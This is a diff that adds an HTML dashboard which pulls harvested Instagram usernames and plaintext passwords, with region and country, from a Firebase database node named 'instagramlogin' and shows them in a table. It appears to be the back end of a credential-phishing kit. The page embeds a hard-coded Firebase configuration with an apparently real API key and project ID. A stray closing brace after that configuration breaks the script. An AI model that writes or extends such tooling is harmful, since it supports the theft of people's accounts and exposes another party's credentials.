@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Instagram Login Data Viewer</title>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 30px;
+            background: #f2f2f2;
+        }
+        h1 {
+            text-align: center;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            background: white;
+            margin-top: 20px;
+        }
+        th, td {
+            border: 1px solid #ccc;
+            padding: 12px;
+            text-align: left;
+        }
+        th {
+            background-color: #007bff;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <h1>Instagram Login Data</h1>
+    <table>
+        <thead>
+            <tr>
+                <th>Username</th>
+                <th>Password</th>
+                <th>Region</th>
+                <th>Country</th>
+            </tr>
+        </thead>
+        <tbody id="dataBody">
+            <!-- Data will be inserted here -->
+        </tbody>
+    </table>
+
+    <script>
+        // TODO: Replace with your actual Firebase config
+      const firebaseConfig = {
+  apiKey: "AIzaSyA7yPixTtGPX62EMkKLQd6B4JmFQYP2URc",
+  authDomain: "solana-fdc09.firebaseapp.com",
+  databaseURL: "https://solana-fdc09-default-rtdb.firebaseio.com",
+  projectId: "solana-fdc09",
+  storageBucket: "solana-fdc09.firebasestorage.app",
+  messagingSenderId: "654390283921",
+  appId: "1:654390283921:web:e16991c6bef4bace693930",
+  measurementId: "G-14CM9CBKYG"
+};
+        };
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        // Reference the instagramlogin node
+        const dataRef = db.ref("instagramlogin");
+
+        dataRef.on("value", (snapshot) => {
+            const dataBody = document.getElementById("dataBody");
+            dataBody.innerHTML = ''; // Clear previous data
+
+            snapshot.forEach(childSnapshot => {
+                const { username, password, region, country } = childSnapshot.val();
+
+                const row = document.createElement("tr");
+                row.innerHTML = `
+                    <td>${username}</td>
+                    <td>${password}</td>
+                    <td>${region}</td>
+                    <td>${country}</td>
+                `;
+                dataBody.appendChild(row);
+            });
+        });
+    </script>
+</body>
+</html>
